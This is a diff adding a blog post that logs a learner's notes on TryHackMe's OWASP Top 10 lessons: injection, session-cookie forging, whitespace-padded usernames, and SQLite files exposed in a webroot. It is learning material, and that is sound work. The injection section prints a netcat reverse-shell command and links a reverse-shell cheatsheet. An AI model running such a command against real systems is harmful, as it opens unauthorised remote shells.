@@ -1,0 +1,30 @@
+---
+title: 'TryHackMe: Complete Beginner'
+date: 2021-10-05 05:00:00.000000000 Z
+layout: post-external
+original_link: https://cardboard-iguana.com/log/2021-10-05-tryhackme-complete-beginner.html
+author: 100007
+---
+
+<h1 id="tryhackme-complete-beginner">TryHackMe: Complete Beginner</h1>
+<p><strong>author:</strong> Nathan Acks<br />
+<strong>date:</strong> 2021-10-05</p>
+<h2 id="owasp-top-10">OWASP Top 10</h2>
+<h3 id="severity-01-injection">(Severity 01) Injection</h3>
+<p>Some versions of netcat support a -e flag that hooks STDIN and STDOUT of an executable to the established network connection. So something like:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-e</span> /bin/bash <span class="nv">$LOCAL_IP</span> <span class="nv">$LOCAL_PORT</span>
+</code></pre></div></div>
+<p>I’m pretty sure that this would have allowed us to avoid all of the named-pipe-magic that Metsploit generated a couple of days ago… Though I’m also pretty sure that Metasploit’s code is more robust (since it will work with versions of nc that <em>don’t</em> support the -e flag).</p>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">A library of reverse shell methods.</a></p>
+<p>Injection attacks can be divided into two broad classes:</p>
+<p>BLIND attacks are ones where command output is not returned to the attacker in a server response.</p>
+<p>ACTIVE attacks are those where the command output <em>is</em> returned to the attacker in a server response.</p>
+<ul>
+<li><a href="https://cardboard-iguana.com/log/2021-10-02-tryhackme-complete-beginner.html">2021-10-02 - TryHackMe: Complete Beginner</a></li>
+</ul>
+<h3 id="severity-02-broken-authentication">(Severity 02) Broken Authentication</h3>
+<p>Sometimes you don’t need to steal a session cookie… If the webserver isn’t setting session cookies in a sufficiently random fashion, <em>forging</em> one can become an option!</p>
+<p>The TryHackMe tutorial implies that a common mistake is to allow the registration of a username that matches an existing user but with a leading or trailing whitespace character; sometimes this new user will be interpreted to be the same as the old user (the one without the whitespace), resulting in the same level of access as that user.</p>
+<p>Honestly, I’m trying to imagine how this would happen in most realistic contexts. Yes, it’s easy to construct an example in Bash (etc.), but most languages I’ve seen web apps written it take string quoting a lot more seriously.</p>
+<h3 id="severity-03-sensitive-data-exposure">(Severity 03) Sensitive Data Exposure</h3>
+<p>So, the trick this section is talking about is that some small web applications use SQLite databases, and a sloppy webdev might store the database file in the application webroot where it can be downloaded and then read at our leisure.</p>
